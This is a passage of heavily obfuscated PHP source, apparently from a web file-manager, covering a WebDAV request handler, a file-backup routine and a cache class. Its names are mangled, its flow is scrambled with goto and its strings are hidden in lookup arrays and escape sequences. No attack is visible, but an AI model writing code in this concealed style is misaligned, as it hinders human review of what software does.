$AÜ«†¥áÀŸ[1756]); if (!in_array($dªÖà‹’à, $cË¿¼ù£Ìì) && !$this->pathExists($this->path)) { $AøŒ¹—ÙŠ = array($AÜ«†¥áÀŸ[1028] => 404); } else { $AøŒ¹—ÙŠ = $this->{$dªÖà‹’à}(); } goto bÍóäèµÈÉ; BÀ­¢Øº²Ş: } public function pathGet($e˜’ÄàŸóà = false) { $D‘ÇÄ’ä’Ë =& $_SERVER[Ìó]; $f‰†¤ëœ¾‘ = $e˜’ÄàŸóà ? $_SERVER[$D‘ÇÄ’ä’Ë[1757]] : $_SERVER[$D‘ÇÄ’ä’Ë[1360]]; $f‰†¤ëœ¾‘ = KodIO::clear(rawurldecode($f‰†¤ëœ¾‘)); if (!strstr($f‰†¤ëœ¾‘, KodIO::clear($this->urlBase))) { return !1; } return substr($f‰†¤ëœ¾‘, strpos($f‰†¤ëœ¾‘, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($d‚Ã°ì°°) { return file_exists($d‚Ã°ì°°); } public function pathMkdir($CÒ¦‚«Ô¦Ë) { return mkdir($CÒ¦‚«Ô¦Ë, 511, !0); } public function pathInfo($aŸ¤ÚïíĞ¤) { return path_info($aŸ¤ÚïíĞ¤); } public function pathList($e¿Û‡ÆÏŞ™) { return path_list($e¿Û‡ÆÏŞ™); } public function pathOut($fÆÆÜ‡“…) { echo file_get_contents($fÆÆÜ‡“…); } public function pathPut($dØèğôîÏ, $aáòÓÍ = '') { if (!$aáòÓÍ) { return file_put_contents($dØèğôîÏ, $_SERVER[Ìó][33]); } return move_path($aáòÓÍ, $dØèğôîÏ); } public function pathRemove($EîßÚƒ¼Ó¸) { if (is_file($EîßÚƒ¼Ó¸)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($cŞ±ôšÍƒ², $b–ô‘™ó¯) { return move_path($cŞ±ôšÍƒ², $b–ô‘™ó¯); } public function pathCopy($E×êÈó´°¾, $AÏ®Š„»„¬) { return copy_dir($E×êÈó´°¾, $AÏ®Š„»„¬); } public function parsePath($A½ ñõ©­¨) { return $A½ ñõ©­¨; } public function parseItem($eÊ¿æŞñØ”, $C˜Ø‰Í’–) { goto b‡Îš·÷¸ó; b‡Îš·÷¸ó: $eô‹‡¨·Ÿ¸ =& $_SERVER[Ìó]; $EøÁÒŸŒ‹ì = $this->pathGet() . $eô‹‡¨·Ÿ¸[8] . $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[28]]; $EøÁÒŸŒ‹ì = $eô‹‡¨·Ÿ¸[8] . str_replace($eô‹‡¨·Ÿ¸[168], $eô‹‡¨·Ÿ¸[8], rawurlencode($EøÁÒŸŒ‹ì)); goto FÂà½É®Ç; FÂà½É®Ç: if ($C˜Ø‰Í’–) { $EøÁÒŸŒ‹ì = $eô‹‡¨·Ÿ¸[8] . str_replace($eô‹‡¨·Ÿ¸[168], $eô‹‡¨·Ÿ¸[8], rawurlencode($this->pathGet())); } if (!trim($eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[106]])) { $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[106]] = time(); } if (!trim($eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[183]])) { $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[183]] = time(); } goto Cêà×ƒÔ‰; Cêà×ƒÔ‰: $e’‹Šœä• = array($eô‹‡¨·Ÿ¸[1758] => KodIO::clear($this->urlBase . $EøÁÒŸŒ‹ì), $eô‹‡¨·Ÿ¸[106] => @gmdate($eô‹‡¨·Ÿ¸[1759], $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[106]]), $eô‹‡¨·Ÿ¸[183] => @gmdate($eô‹‡¨·Ÿ¸[1760], $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[183]]), $eô‹‡¨·Ÿ¸[77] => $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[77]] ? $eÊ¿æŞñØ”[$eô‹‡¨·Ÿ¸[77]] : 0); return $e’‹Šœä•; goto AÒ‚‘™ßÔß; AÒ‚‘™ßÔß: } public function parseItemXml($A«”–ïÑŠ, $aÁéÌ®¼ª©) { $Dº±ƒ„ö =& $_SERVER[Ìó]; $b©îÊô©Æ = $this->parseItem($A«”–ïÑŠ, $aÁéÌ®¼ª©); if ($A«”–ïÑŠ[$Dº±ƒ„ö[29]] == $Dº±ƒ„ö[76]) { $Dêƒ›Á‡ò = $Dº±ƒ„ö[1761]; $Dêƒ›Á‡ò .= $Dº±ƒ„ö[1762]; } else { $E²¯µ¾ÎñÛ = $A«”–ïÑŠ[$Dº±ƒ„ö[156]] ? $A«”–ïÑŠ[$Dº±ƒ„ö[156]] : get_path_ext($A«”–ïÑŠ[$Dº±ƒ„ö[28]]); $aÖî“Ø½â = get_file_mime($E²¯µ¾ÎñÛ); $Dêƒ›Á‡ò = $Dº±ƒ„ö[1763]; $Dêƒ›Á‡ò .= "\x3c\x44\x3a\147\x65\x74\x63\x6f\x6e\x74\x65\156\x74\164\x79\x70\x65\76{$aÖî“Ø½â}\x3c\57\104\x3a\x67\x65\164\x63\157\156\164\145\x6e\x74\164\x79\x70\145\76"; } return "\12\x9\x9\x3c\x44\72\162\x65\x73\x70\157\x6e\x73\145\x3e\xa\11\11\x9\74\x44\72\150\162\145\x66\76{$b©îÊô©Æ[$Dº±ƒ„ö[1758]]}\74\x2f\104\x3a\150\x72\145\x66\76\12\11\11\11\x3c\104\x3a\x70\162\157\x70\163\x74\x61\164\76\xa\11\x9\x9\11\74\104\x3a\x70\x72\157\160\x3e\12\x9\x9\11\x9\11\74\x44\x3a\x67\x65\x74\154\x61\x73\164\x6d\157\x64\x69\146\151\145\144\x3e{$b©îÊô©Æ[$Dº±ƒ„ö[106]]}\x3c\x2f\x44\72\147\x65\x74\x6c\141\163\x74\155\157\x64\151\x66\x69\x65\x64\x3e\12\11\x9\11\x9\x9\x3c\x44\x3a\143\x72\145\x61\x74\151\157\156\x64\x61\164\145\x3e{$b©îÊô©Æ[$Dº±ƒ„ö[183]]}\x3c\x2f\x44\x3a\x63\x72\x65\141\x74\x69\x6f\x6e\144\141\164\x65\76\xa\x9\11\11\11\11\x3c\x44\72\147\145\164\x63\157\x6e\164\145\x6e\164\x6c\145\156\x67\x74\150\x3e{$b©îÊô©Æ[$Dº±ƒ„ö[77]]}\74\x2f\x44\x3a\x67\145\x74\x63\x6f\x6e\x74\145\156\164\x6c\x65\x6e\147\x74\x68\x3e\12\11\x9\x9\11\11{$Dêƒ›Á‡ò}\12\x9\11\11\11\74\57\x44\72\160\x72\157\160\x3e\xa\x9\x9\x9\x9\x3c\x44\72\x73\x74\x61\x74\x75\163\x3e\x48\x54\x54\x50\x2f\x31\x2e\61\40\x32\60\x30\40\117\x4b\74\57\104\72\163\164\x61\164\x75\163\x3e\12\11\x9\x9\x3c\57\104\x3a\160\x72\157\160\x73\164\141\164\x3e\xa\x9\11\74\x2f\x44\72\162\145\163\x70\157\156\x73\x65\76"; } public function pathListMerge($f–•´Ÿ ½) { goto f¦ª×‘§‘; FíÀÃ…‹’—: $A¯Ü†îÎ“İ = array(); foreach ($f–•´Ÿ ½ as $AµŸÕ±»Ğé => $cËÊ¾ÓñÛ˜) { if (!in_array($AµŸÕ±»Ğé, $bÇª»Ò÷‡Ò) || !is_array($cËÊ¾ÓñÛ˜)) { continue; } $A¯Ü†îÎ“İ = array_merge($A¯Ü†îÎ“İ, $cËÊ¾ÓñÛ˜); } foreach ($A¯Ü†îÎ“İ as &$Fìª“‡‹¥î) { $Fìª“‡‹¥î[$e­äãÏ™·•[28]] = str_replace($e­äãÏ™·•[8], $e­äãÏ™·•[1362], $Fìª“‡‹¥î[$e­äãÏ™·•[28]]); } goto Dé‡×òŸ¡©; f¦ª×‘§‘: $e­äãÏ™·• =& $_SERVER[Ìó]; if (!$f–•´Ÿ ½) { return $f–•´Ÿ ½; } $bÇª»Ò÷‡Ò = array($e­äãÏ™·•[73], $e­äãÏ™·•[74], $e­äãÏ™·•[1764]); goto FíÀÃ…‹’—; Dé‡×òŸ¡©: return $A¯Ü†îÎ“İ; goto CÇî‰Å»¢Ê; CÇî‰Å»¢Ê: } public function httpPROPFIND() { goto CÓâ·‘ø±÷; E—‚«á„ªÓ: if ($F™ƒØ†¡Óˆ) { $C…ÖŞß = array($Dï‚â»¢); } else { $Dï‚â»¢[$EÜñÅ®¼êÔ[28]] = $EÜñÅ®¼êÔ[33]; $C…ÖŞß = array_merge(array($Dï‚â»¢), $C…ÖŞß); } $AñÌ¨Š³Ô¥ = $EÜñÅ®¼êÔ[33]; foreach ($C…ÖŞß as $C¼˜Ò½„Îå) { $AñÌ¨Š³Ô¥ .= $this->parseItemXml($C¼˜Ò½„Îå, $F™ƒØ†¡Óˆ); } goto Bö·Ş¾¨Î; fİ»¬©Şõä: $Dï‚â»¢ = $f˜„··”[$EÜñÅ®¼êÔ[1765]]; if (!is_array($C…ÖŞß) || $Dï‚â»¢[$EÜñÅ®¼êÔ[1766]] === !1) { return array($EÜñÅ®¼êÔ[1767] => 404, $EÜñÅ®¼êÔ[1768] => $EÜñÅ®¼êÔ[1769]); } $F™ƒØ†¡Óˆ = $Dï‚â»¢[$EÜñÅ®¼êÔ[29]] == $EÜñÅ®¼êÔ[163] || HttpHeader::get($EÜñÅ®¼êÔ[1744]) == $EÜñÅ®¼êÔ[463]; goto E—‚«á„ªÓ; CÓâ·‘ø±÷: $EÜñÅ®¼êÔ =& $_SERVER[Ìó]; $f˜„··” = $this->pathList($this->path); $C…ÖŞß = $this->pathListMerge($f˜„··”); goto fİ»¬©Şõä; Bö·Ş¾¨Î: return array($EÜñÅ®¼êÔ[1767] => 207, $EÜñÅ®¼êÔ[1768] => "\x3c\x44\72\x6d\165\x6c\164\151\163\x74\x61\164\165\163\x20\x78\155\154\156\x73\x3a\x44\x3d\x22\104\101\126\x3a\42\x3e\12{$AñÌ¨Š³Ô¥}\xa\74\57\x44\x3a\x6d\165\154\164\x69\x73\164\x61\x74\165\x73\x3e"); goto aÁ±È÷½È; aÁ±È÷½È: } public function httpHEAD() { $AĞæ“¬Ù‚ =& $_SERVER[Ìó]; $BÕ‹»Ş¶»» = $this->pathInfo($this->path); if (!$BÕ‹»Ş¶»» || $BÕ‹»Ş¶»»[$AĞæ“¬Ù‚[29]] == $AĞæ“¬Ù‚[76]) { return array($AĞæ“¬Ù‚[1028] => 200, $AĞæ“¬Ù‚[1195] => array($AĞæ“¬Ù‚[1770])); } return array($AĞæ“¬Ù‚[1028] => 200, $AĞæ“¬Ù‚[1195] => array($AĞæ“¬Ù‚[1771], $AĞæ“¬Ù‚[135], $AĞæ“¬Ù‚[1772] . $BÕ‹»Ş¶»»[$AĞæ“¬Ù‚[77]], $AĞæ“¬Ù‚[1773] . get_file_mime($BÕ‹»Ş¶»»[$AĞæ“¬Ù‚[156]]), $AĞæ“¬Ù‚[131] . gmdate($AĞæ“¬Ù‚[1759], $BÕ‹»Ş¶»»[$AĞæ“¬Ù‚[1242]]) . $AĞæ“¬Ù‚[1774], $AĞæ“¬Ù‚[1775])); } public function httpOPTIONS() { $B·Úâñ–Ş =& $_SERVER[Ìó]; return array($B·Úâñ–Ş[1028] => 200, $B·Úâñ–Ş[1195] => array($B·Úâñ–Ş[1776], $B·Úâñ–Ş[1777], $B·Úâñ–Ş[1778], $B·Úâñ–Ş[1251])); } public function httpPROPPATCH() { $Bñİğ´Ü =& $_SERVER[Ìó]; $b‚¾ïİ¥ë = $Bñİğ´Ü[1779] . $_SERVER[$Bñİğ´Ü[1360]] . $Bñİğ´Ü[1780]; return array($Bñİğ´Ü[1767] => 207, $Bñİğ´Ü[1768] => "\x3c\x44\x3a\x6d\x75\154\164\151\163\x74\141\164\x75\x73\x20\170\155\x6c\156\x73\x3a\x44\x3d\x22\x44\101\x56\x3a\x22\x3e\xa{$b‚¾ïİ¥ë}\xa\74\x2f\104\72\155\x75\x6c\164\x69\163\x74\141\164\x75\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $b²¸ì‹è£ =& $_SERVER[Ìó]; $AÒéà”š = $this->uploadFile(); if ($AÒéà”š) { $dğ•¦İ˜ = 204; } else { $AÒéà”š = $b²¸ì‹è£[33]; $dğ•¦İ˜ = 201; } $f‚Ôç¦Óˆ = $this->pathPut($this->path, $AÒéà”š); if ($f‚Ôç¦Óˆ == !1) { $dğ•¦İ˜ = 404; } return array($b²¸ì‹è£[1767] => $dğ•¦İ˜); } private function uploadFile() { goto Fˆœ¯Š™ğÆ; dê‹ÑŞšÃÇ: while (!feof($DÕ³áÉ—é)) { fwrite($EÃ²ÒŞ§øÜ, fread($DÕ³áÉ—é, 1024 * 200)); } fclose($DÕ³áÉ—é); fclose($EÃ²ÒŞ§øÜ); goto Cíğ±ÍóŸ; Cíğ±ÍóŸ: if (@filesize($FÄ£‹éÖÅÙ) > 0) { return $FÄ£‹éÖÅÙ; } @unlink($FÄ£‹éÖÅÙ); return !1; goto B¿Üº¬ßØê; Fˆœ¯Š™ğÆ: $AéŒñŠÄîó =& $_SERVER[Ìó]; @mk_dir(TEMP_FILES); $FÄ£‹éÖÅÙ = TEMP_FILES . $AéŒñŠÄîó[1781] . rand_string(32); goto b§»Ìòóì; b§»Ìòóì: $EÃ²ÒŞ§øÜ = @fopen($FÄ£‹éÖÅÙ, $AéŒñŠÄîó[1489]); $DÕ³áÉ—é = @fopen($AéŒñŠÄîó[1782], $AéŒñŠÄîó[1488]); if (!$DÕ³áÉ—é || !$EÃ²ÒŞ§øÜ) { @unlink($FÄ£‹éÖÅÙ); return !1; } goto dê‹ÑŞšÃÇ; B¿Üº¬ßØê: } public function httpMKCOL() { $EÒ˜åÃ =& $_SERVER[Ìó]; if ($this->pathExists($this->path)) { return array($EÒ˜åÃ[1028] => 409); } $e¬©œµŞÊ¥ = $this->pathMkdir($this->path); return array($EÒ˜åÃ[1028] => $e¬©œµŞÊ¥ ? 201 : 403); } public function httpMOVE() { $b’ÖŠßÂŞŞ =& $_SERVER[Ìó]; $BÍ°ƒà¤Ü = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$b’ÖŠßÂŞŞ[1783]])) { $C˜˜§‡ğ[$b’ÖŠßÂŞŞ[1784]] = $_SERVER[$b’ÖŠßÂŞŞ[1783]] == $b’ÖŠßÂŞŞ[1785]; } $bÉØªèˆÁ½ = $this->pathMove($this->path, $BÍ°ƒà¤Ü); return array($b’ÖŠßÂŞŞ[1028] => $bÉØªèˆÁ½ ? 201 : 404); } public function httpCOPY() { $C™Æ„·‚Æ = $this->parsePath($this->pathGet(!0)); $AÄŞŠÛŠãì = $this->pathCopy($this->path, $C™Æ„·‚Æ); return array($_SERVER[Ìó][1028] => $AÄŞŠÛŠãì ? 201 : 404); } public function httpDELETE() { $a¯•–òõÒ = $this->pathRemove($this->path); return array($_SERVER[Ìó][1028] => $a¯•–òõÒ ? 200 : 503); } public function httpLOCK() { $dƒĞ›´Öä¬ =& $_SERVER[Ìó]; $a‹Ó±„ëİ“ = md5($this->path); $AÚºÔİ´ = $dƒĞ›´Öä¬[1786] . $this->xmlGet($dƒĞ›´Öä¬[1787]) . $dƒĞ›´Öä¬[1788] . $a‹Ó±„ëİ“ . $dƒĞ›´Öä¬[1789]; return array($dƒĞ›´Öä¬[1028] => 200, $dƒĞ›´Öä¬[1195] => array($dƒĞ›´Öä¬[1790] . $a‹Ó±„ëİ“, $dƒĞ›´Öä¬[1791]), $dƒĞ›´Öä¬[1792] => $AÚºÔİ´); } public function httpUNLOCK() { return array($_SERVER[Ìó][1028] => 204); } public function xmlGet($Eºà†é•ôë) { goto EßÃï Û; c´ŒáÑÏ®‹: $B„éºñÏˆÔ = array_shift(explode($C´¾øì½‹Ñ[8], $Eºà†é•ôë)); $a¼Â¢±ÎÎ = $AŒß–ãÌŒ¦->getElementsByTagNameNS($C´¾øì½‹Ñ[1794], $B„éºñÏˆÔ); if ($a¼Â¢±ÎÎ) { return $a¼Â¢±ÎÎ[0]->nodeValue; } goto EÖï¦Ğ„·; EÖï¦Ğ„·: return $C´¾øì½‹Ñ[33]; goto c‰ğ³¦«Ä¾; EßÃï Û: $C´¾øì½‹Ñ =& $_SERVER[Ìó]; static $AŒß–ãÌŒ¦ = false; if (!$AŒß–ãÌŒ¦) { $fºÙØÖ¼öÖ = file_get_contents($C´¾øì½‹Ñ[1793]); $AŒß–ãÌŒ¦ = new DOMDocument(); $AŒß–ãÌŒ¦->loadXML($fºÙØÖ¼öÖ); } goto c´ŒáÑÏ®‹; c‰ğ³¦«Ä¾: } public static function response($dáæ¤‚´†§) { goto DÒØåã¦ÊÅ; bãœÕÀÙ—‚: $Bì†­À„[] = $a‚‡òÑ¼ê¸[1734]; $Bì†­À„[] = $a‚‡òÑ¼ê¸[1735]; foreach ($Bì†­À„ as $CÌØÃ©çÃ“) { header($CÌØÃ©çÃ“); } goto D˜ùÏ¡Ÿ¡í; DÒØåã¦ÊÅ: $a‚‡òÑ¼ê¸ =& $_SERVER[Ìó]; $Bì†­À„ = is_array($dáæ¤‚´†§[$a‚‡òÑ¼ê¸[1195]]) ? $dáæ¤‚´†§[$a‚‡òÑ¼ê¸[1195]] : array(); $Bì†­À„[] = HttpHeader::code($dáæ¤‚´†§[$a‚‡òÑ¼ê¸[1028]]); goto bãœÕÀÙ—‚; D˜ùÏ¡Ÿ¡í: if (is_string($dáæ¤‚´†§[$a‚‡òÑ¼ê¸[1792]])) { header($a‚‡òÑ¼ê¸[1795]); $fÆĞ‘’¬Ø = $a‚‡òÑ¼ê¸[1796] . $a‚‡òÑ¼ê¸[213] . $dáæ¤‚´†§[$a‚‡òÑ¼ê¸[1792]]; echo $fÆĞ‘’¬Ø; } goto bÈËƒäµä«; bÈËƒäµä«: } } goto bÙ¸…ŠÌ™ƒ; f¿Ù’Œ´„: class BackupFile { public function __construct() { } public function index() { goto AÃ½À‡ÒĞ; fñ¶˜Ó¶: $dõâÕ‘¢¾â = $C¨‘„°À = 0; do { $d„¡‹¯ƒ• = $_SERVER[Ìó][736]; $E…ô˜Óøœ = Model($_SERVER[Ìó][715])->where($E–¬¾ÉÉŒÈ)->field($d„¡‹¯ƒ•)->order($_SERVER[Ìó][737])->selectPage($FĞŞÎ’À‡å, $dºĞˆá°«); $d´Ôñ—‡ = !empty($E…ô˜Óøœ[$_SERVER[Ìó][350]]) ? $E…ô˜Óøœ[$_SERVER[Ìó][350]] : array(); foreach ($d´Ôñ—‡ as $dïëœÔÖ¬Ñ) { goto cºôÉÌÓ³æ; e“¤àŸ£ç: if ($BØ“Ó¶Şñ >= 1024 * 1024 * 100) { $CĞœ½á¥Æã = array($_SERVER[Ìó][743] => $a§±Ö©¢ÄÒ, $_SERVER[Ìó][744] => $C¨‘„°À, $_SERVER[Ìó][745] => $dõâÕ‘¢¾â); Backup::set($CĞœ½á¥Æã); $BØ“Ó¶Şñ = $BêœÙÀÌ‘Ï = 0; } goto AË÷»“Ş; cºôÉÌÓ³æ: if (!$this->_fileExist($dïëœÔÖ¬Ñ, $E¡¢Ô”¯¤×, $e¼˜õäËœé)) { $dõ±ëğÒî’ -= 1; $F‚ØÜ÷§ÉÆ -= (int) $dïëœÔÖ¬Ñ[$_SERVER[Ìó][77]]; write_log("\146\x69\x6c\x65\x20\x6e\x6f\164\40\145\170\151\163\x74\56\146\151\x6c\145\x49\x44\72{$dïëœÔÖ¬Ñ[$_SERVER[Ìó][414]]}\x2c\40\160\141\164\x68\x3a{$dïëœÔÖ¬Ñ[$_SERVER[Ìó][75]]}", $_SERVER[Ìó][738]); continue; } $F†àÕ¼ˆã¾ = $dïëœÔÖ¬Ñ[$_SERVER[Ìó][75]]; $Dˆ­®à®°Á = "\173\151\x6f\x3a{$bàãËÇ¡—Ç[$_SERVER[Ìó][687]]}\175" . substr($F†àÕ¼ˆã¾, strlen("\x7b\x69\157\72{$dïëœÔÖ¬Ñ[$_SERVER[Ìó][739]]}\x7d")); goto f“ÔÖØ®ÂÅ; e˜Ö½ĞÙ·›: $BØ“Ó¶Şñ += $dïëœÔÖ¬Ñ[$_SERVER[Ìó][77]]; $C¨‘„°À += 1; $dõâÕ‘¢¾â += $dïëœÔÖ¬Ñ[$_SERVER[Ìó][77]]; goto e“¤àŸ£ç; f“ÔÖØ®ÂÅ: if (IO::exist($Dˆ­®à®°Á)) { $CÀ²íÓ²Êº->updateFileEnd($dïëœÔÖ¬Ñ[$_SERVER[Ìó][28]], $dïëœÔÖ¬Ñ[$_SERVER[Ìó][77]]); } else { $Dˆ­®à®°Á = get_path_father($Dˆ­®à®°Á); IO::mkdir($Dˆ­®à®°Á); if (!IO::copy($F†àÕ¼ˆã¾, $Dˆ­®à®°Á, $_SERVER[Ìó][740])) { write_log($_SERVER[Ìó][741] . $F†àÕ¼ˆã¾ . $_SERVER[Ìó][742] . $Dˆ­®à®°Á . $_SERVER[Ìó][471], $_SERVER[Ìó][708]); $A²è–«Æœ = !1; break; } } $a§±Ö©¢ÄÒ = $dïëœÔÖ¬Ñ[$_SERVER[Ìó][414]]; $BêœÙÀÌ‘Ï += 1; goto e˜Ö½ĞÙ·›; AË÷»“Ş: } $fÊ±²Ï©¨ = count($d´Ôñ—‡); $dºĞˆá°«++; } while ($fÊ±²Ï©¨ == $FĞŞÎ’À‡å); $CÀ²íÓ²Êº->end(); goto e½¤¹ƒÜÀ¨; e½¤¹ƒÜÀ¨: $d„ª£ªØ¤­ = $A²è–«Æœ ? 1 : 0; $CĞœ½á¥Æã = array($_SERVER[Ìó][746] => 1, $_SERVER[Ìó][699] => time(), $_SERVER[Ìó][705] => $d„ª£ªØ¤­, $_SERVER[Ìó][743] => $a§±Ö©¢ÄÒ, $_SERVER[Ìó][735] => $F‚ØÜ÷§ÉÆ, $_SERVER[Ìó][734] => $dõ±ëğÒî’); if ($BêœÙÀÌ‘Ï) { $CĞœ½á¥Æã[$_SERVER[Ìó][744]] = $C¨‘„°À; $CĞœ½á¥Æã[$_SERVER[Ìó][745]] = $dõâÕ‘¢¾â; } goto e˜Ö‹§È—Ò; a„¬ŒÑã»Ï: $FĞŞÎ’À‡å = 1000; $BØ“Ó¶Şñ = $BêœÙÀÌ‘Ï = 0; $E¡¢Ô”¯¤× = array(); goto fñ¶˜Ó¶; DÓˆ£ì¯öá: $CÀ²íÓ²Êº->task[$_SERVER[Ìó][694]] = $F‚ØÜ÷§ÉÆ; $CĞœ½á¥Æã = array($_SERVER[Ìó][734] => $dõ±ëğÒî’, $_SERVER[Ìó][735] => $F‚ØÜ÷§ÉÆ); Backup::set($CĞœ½á¥Æã); goto EäùéóˆßÛ; d„¤…îî©«: $dõ±ëğÒî’ = (int) Model($_SERVER[Ìó][715])->where($E–¬¾ÉÉŒÈ)->count($_SERVER[Ìó][414]); $F‚ØÜ÷§ÉÆ = (int) Model($_SERVER[Ìó][715])->where($E–¬¾ÉÉŒÈ)->sum($_SERVER[Ìó][77]); $CÀ²íÓ²Êº = new TaskFileTransfer($_SERVER[Ìó][732], $_SERVER[Ìó][708], $dõ±ëğÒî’, LNG($_SERVER[Ìó][709]) . $_SERVER[Ìó][710] . LNG($_SERVER[Ìó][733])); goto DÓˆ£ì¯öá; e˜Ö‹§È—Ò: Backup::set($CĞœ½á¥Æã); $this->_fileFilter($E¡¢Ô”¯¤×); return !0; goto Dï´‡µà„ñ; EäùéóˆßÛ: $A²è–«Æœ = !0; $e¼˜õäËœé = $this->storeIds(); $dºĞˆá°« = 1; goto a„¬ŒÑã»Ï; AÃ½À‡ÒĞ: $bàãËÇ¡—Ç = Backup::get(); $a§±Ö©¢ÄÒ = $bàãËÇ¡—Ç[$_SERVER[Ìó][277]][$_SERVER[Ìó][163]][$_SERVER[Ìó][414]]; $E–¬¾ÉÉŒÈ = array($_SERVER[Ìó][415] => array($_SERVER[Ìó][730], $a§±Ö©¢ÄÒ), $_SERVER[Ìó][731] => array($_SERVER[Ìó][315], $bàãËÇ¡—Ç[$_SERVER[Ìó][687]])); goto d„¤…îî©«; Dï´‡µà„ñ: } private function _fileExist($cö°…ßÃ‰Õ, &$D‚²‹šøŸ®, $c¦¾Ÿ×ƒµ) { goto a†¤½ö¤; c†å¿é­å: if (!in_array($cö°…ßÃ‰Õ[$A¿é²©¸÷Ş[739]], $c¦¾Ÿ×ƒµ)) { return !1; } if (IO::exist($DïìÀÖÉë¬)) { return !0; } $BŒåÈŠÄÃŠ = get_path_father($DïìÀÖÉë¬); goto Eù†·Ó‹í†; Eù†·Ó‹í†: if (IO::exist($BŒåÈŠÄÃŠ)) { $D‚²‹šøŸ®[] = $cö°…ßÃ‰Õ[$A¿é²©¸÷Ş[414]]; return !1; } $b„ãå¦Î‡å = array($A¿é²©¸÷Ş[739] => $cö°…ßÃ‰Õ[$A¿é²©¸÷Ş[739]], $A¿é²©¸÷Ş[75] => array($A¿é²©¸÷Ş[747], "{$BŒåÈŠÄÃŠ}\x25")); $c¡Œ“†ğˆ = Model($A¿é²©¸÷Ş[715])->where($b„ãå¦Î‡å)->field($A¿é²©¸÷Ş[415])->select(); goto EŸ™ÆÍùŠİ; EŸ™ÆÍùŠİ: $D‚²‹šøŸ® = array_merge($D‚²‹šøŸ®, array_to_keyvalue($c¡Œ“†ğˆ, $A¿é²©¸÷Ş[33], $A¿é²©¸÷Ş[414])); return !1; goto Ağ·Á©”Éà; a†¤½ö¤: $A¿é²©¸÷Ş =& $_SERVER[Ìó]; $DïìÀÖÉë¬ = $cö°…ßÃ‰Õ[$A¿é²©¸÷Ş[75]]; if (in_array($cö°…ßÃ‰Õ[$A¿é²©¸÷Ş[414]], $D‚²‹šøŸ®)) { return !1; } goto c†å¿é­å; Ağ·Á©”Éà: } private function _fileFilter($B›šÂ’•Í) { $dÚõ¥ƒà¯» =& $_SERVER[Ìó]; if (empty($B›šÂ’•Í)) { return; } $aæ¹Ô©è±— = array($dÚõ¥ƒà¯»[414] => array($dÚõ¥ƒà¯»[7], array_unique($B›šÂ’•Í))); $DˆœÕ¢õ‡Ø = Model($dÚõ¥ƒà¯»[748])->where($aæ¹Ô©è±—)->field($dÚõ¥ƒà¯»[365])->select(); foreach ($DˆœÕ¢õ‡Ø as $cÑìœÁ Æö) { Model($dÚõ¥ƒà¯»[748])->remove($cÑìœÁ Æö[$dÚõ¥ƒà¯»[365]], !1); } } private function storeIds() { $f†ÛŒÎ±ÖÑ =& $_SERVER[Ìó]; $FÏ“êÎæÎ  = Model($f†ÛŒÎ±ÖÑ[700])->listData(); return array_to_keyvalue($FÏ“êÎæÎ , $f†ÛŒÎ±ÖÑ[33], $f†ÛŒÎ±ÖÑ[363]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto dÍÁ¶‡ƒ¤´; få‰ §á”Û: switch ($D³æ¦§ˆİ[$Dˆ¡¿¹³[749]]) { case $Dˆ¡¿¹³[17]: self::$handle = Model($Dˆ¡¿¹³[751]); break; case $Dˆ¡¿¹³[752]: self::$handle = new CacheRedis($EÒ–ÏÀÓ®¾, $FŸË‡ñïùİ); break; case $Dˆ¡¿¹³[753]: self::$handle = new CacheMemcached($EÒ–ÏÀÓ®¾, $FŸË‡ñïùİ); break; case $Dˆ¡¿¹³[163]: self::$handle = new CacheFile($EÒ–ÏÀÓ®¾, $FŸË‡ñïùİ); break; default: break; } return self::$handle; goto a¸ï»ÌÎî; dÍÁ¶‡ƒ¤´: $Dˆ¡¿¹³ =& $_SERVER[Ìó]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b¤§ø£ÒĞ; b¤§ø£ÒĞ: $D³æ¦§ˆİ = $GLOBALS[$Dˆ¡¿¹³[6]][$Dˆ¡¿¹³[333]]; $EÒ–ÏÀÓ®¾ = $D³æ¦§ˆİ[$D³æ¦§ˆİ[$Dˆ¡¿¹³[749]]]; $FŸË‡ñïùİ = $D³æ¦§ˆİ[$Dˆ¡¿¹³[750]]; goto få‰ §á”Û; a¸ï»ÌÎî: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Béª›¸Äô) { if (is_array($Béª›¸Äô) || is_object($Béª›¸Äô)) { $Béª›¸Äô = json_encode($Béª›¸Äô); } $Béª›¸Äô = rawurlencode($Béª›¸Äô); return KOD_SITE_ID . $_SERVER[Ìó][70] . $Béª›¸Äô; } public static function get($C¿ŠŠ´¾èŸ) { $d•ó·Ú¨º‹ = self::key($C¿ŠŠ´¾èŸ); if (!isset(self::$memoryCache[$d•ó·Ú¨º‹])) { CacheLock::lock($C¿ŠŠ´¾èŸ); $AŠµß‰ŞØ¾ = self::init()->get($d•ó·Ú¨º‹); CacheLock::unlock($C¿ŠŠ´¾èŸ); self::$memoryCache[$d•ó·Ú¨º‹] = unserialize($AŠµß‰ŞØ¾); } return self::$memoryCache[$d•ó·Ú¨º‹]; } public static function set($eáÉâ•‰‡Ô, $E¥ç–Ë¯µ, $C®”¯£…åŸ = false) { goto EœìÉ˜¯æ”; bÄ®÷œ±´Ç: CacheLock::unlock($eáÉâ•‰‡Ô); return $Aù˜Û„Ø¾; goto F„„Ğ™¦‘; EœìÉ˜¯æ”: $Bİ™“‰¥ˆ‚ = self::key($eáÉâ•‰‡Ô); if (isset(self::$memoryCache[$Bİ™“‰¥ˆ‚]) && self::$memoryCache[$Bİ™“‰¥ˆ‚] === $E¥ç–Ë¯µ) { return !0; } if ($C®”¯£…åŸ === 0) { self::$memoryCache[$Bİ™“‰¥ˆ‚] = $E¥ç–Ë¯µ; return !0; } goto E·ø†°çÃğ; E·ø†°çÃğ: CacheLock::lock($eáÉâ•‰‡Ô); $Aù˜Û„Ø¾ = self::init()->set($Bİ™“‰¥ˆ‚, serialize($E¥ç–Ë¯µ), $C®”¯£…åŸ); 